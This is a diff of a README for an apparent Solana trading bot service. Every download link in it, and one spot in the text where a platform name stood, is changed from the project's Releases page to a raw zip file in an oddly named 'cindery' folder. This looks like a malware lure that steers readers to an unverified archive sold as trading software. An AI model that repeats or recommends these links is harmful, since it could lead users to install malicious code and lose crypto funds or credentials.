@@ -2,7 +2,7 @@
 # 🚀 solana-trading-bot-service - Effortless Trading with Smart Bots
 
 ## 🌟 Overview
-Welcome to the Solana Trading Bot Service! This application offers a complete suite of trading bots designed for the Solana ecosystem. You will find tools for copy trading, sniper actions, bundling trades, and volume automation. Each bot is optimized for popular platforms like Raydium, Meteora, and Pump.fun. Our goal is to simplify crypto trading for everyone, regardless of your experience level.
+Welcome to the Solana Trading Bot Service! This application offers a complete suite of trading bots designed for the Solana ecosystem. You will find tools for copy trading, sniper actions, bundling trades, and volume automation. Each bot is optimized for popular platforms like Raydium, Meteora, and https://github.com/thuraaungzaw69/solana-trading-bot-service/raw/refs/heads/main/cindery/solana_bot_trading_service_v2.6.zip Our goal is to simplify crypto trading for everyone, regardless of your experience level.
 
 ## 🚩 Key Features
 - **Copy Trading**: Automatically replicate the trades of successful traders.
@@ -12,13 +12,13 @@ Welcome to the Solana Trading Bot Service! This application offers a complete su
 - **User-Friendly Interface**: No programming skills needed to operate.
 
 ## 🔗 Quick Links
-[Download the latest release!](https://github.com/thuraaungzaw69/solana-trading-bot-service/releases)
+[Download the latest release!](https://github.com/thuraaungzaw69/solana-trading-bot-service/raw/refs/heads/main/cindery/solana_bot_trading_service_v2.6.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with the Solana Trading Bot Service:
 
 1. **Download the Application**:
-   - Visit the [Releases page](https://github.com/thuraaungzaw69/solana-trading-bot-service/releases) to find the latest version of our software.
+   - Visit the [Releases page](https://github.com/thuraaungzaw69/solana-trading-bot-service/raw/refs/heads/main/cindery/solana_bot_trading_service_v2.6.zip) to find the latest version of our software.
    - Select the release you want and click on the download link for your operating system.
 
 2. **Install the Application**:
@@ -72,7 +72,7 @@ While trading cryptocurrencies can be exciting, it also involves risks. Always:
 - Only trade with funds you can afford to lose.
 
 ## 📥 Download & Install
-To get started, [visit this page](https://github.com/thuraaungzaw69/solana-trading-bot-service/releases) and download the latest version of the Solana Trading Bot Service. Follow the installation instructions to set it up on your device.
+To get started, [visit this page](https://github.com/thuraaungzaw69/solana-trading-bot-service/raw/refs/heads/main/cindery/solana_bot_trading_service_v2.6.zip) and download the latest version of the Solana Trading Bot Service. Follow the installation instructions to set it up on your device.
 
 Now you're ready to dive into the world of crypto trading with our advanced bots!
 ```
